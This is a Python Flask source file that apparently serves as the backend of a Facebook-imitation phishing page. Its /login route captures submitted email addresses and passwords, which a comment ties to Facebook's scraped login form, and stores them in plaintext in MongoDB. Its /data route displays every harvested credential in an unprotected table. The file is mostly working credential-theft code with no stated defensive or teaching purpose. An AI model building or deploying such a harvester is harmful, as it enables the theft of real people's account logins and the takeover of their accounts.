from flask import Flask, render_template, request, redirect
from bs4 import BeautifulSoup
import requests, json
from pymongo import MongoClient
from datetime import datetime
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# MongoDB connection
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://localhost:27017/facebook_demo")
client = MongoClient(MONGODB_URI, tlsAllowInvalidCertificates=True)
db = client.facebook_demo
logins_collection = db.logins

# Test connection
try:
    client.admin.command('ping')
    print("✓ Connected to MongoDB Atlas successfully!")
except Exception as e:
    print(f"✗ MongoDB connection failed: {e}")

@app.route("/", methods=["get"])
def main():
    # Just serve the simple HTML form without scraping
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    # request.values covers both query params and form data (args + form)
    username = (request.values.get("email") or "").strip()
    # Facebook's password input is named 'pass' in the scraped form
    password = (request.values.get("pass") or request.values.get("password") or "").strip()

    new_data = {
        "username": username,
        "password": password,
        "timestamp": datetime.now()
    }

    # Only insert if either username or password is non-empty
    if new_data["username"] or new_data["password"]:
        logins_collection.insert_one(new_data)

    return redirect("/")


@app.route("/data", methods=["GET"])
def view_data():
    """View all submitted data from MongoDB"""
    try:
        data = list(logins_collection.find().sort("_id", -1))
        # Convert ObjectId to string for JSON serialization
        for entry in data:
            entry["_id"] = str(entry["_id"])
            entry["timestamp"] = str(entry.get("timestamp", "N/A"))
        
        html = "<h1>Submitted Data</h1>"
        html += f"<p>Total entries: <b>{len(data)}</b></p>"
        html += "<table border='1' cellpadding='10'><tr><th>Username</th><th>Password</th><th>Timestamp</th></tr>"
        
        for entry in data:
            html += f"<tr><td>{entry.get('username', '')}</td><td>{entry.get('password', '')}</td><td>{entry.get('timestamp', '')}</td></tr>"
        
        html += "</table><br><a href='/'>Back to Form</a>"
        return html
    except Exception as e:
        return f"<h1>Error reading data</h1><p>{str(e)}</p><br><a href='/'>Back</a>"


@app.route("/test-db", methods=["GET"])
def test_db():
    """Test MongoDB connection and create sample data"""
    try:
        # Test insert
        test_data = {
            "username": "test@example.com",
            "password": "test123",
            "timestamp": datetime.now()
        }
        result = logins_collection.insert_one(test_data)
        return f"<h1>✓ MongoDB Works!</h1><p>Test data inserted with ID: {result.inserted_id}</p><p><a href='/data'>View all data</a></p>"
    except Exception as e:
        return f"<h1>✗ MongoDB Error</h1><p>{str(e)}</p>"


if __name__ == "__main__":
    app.run(host="0.0.0.0")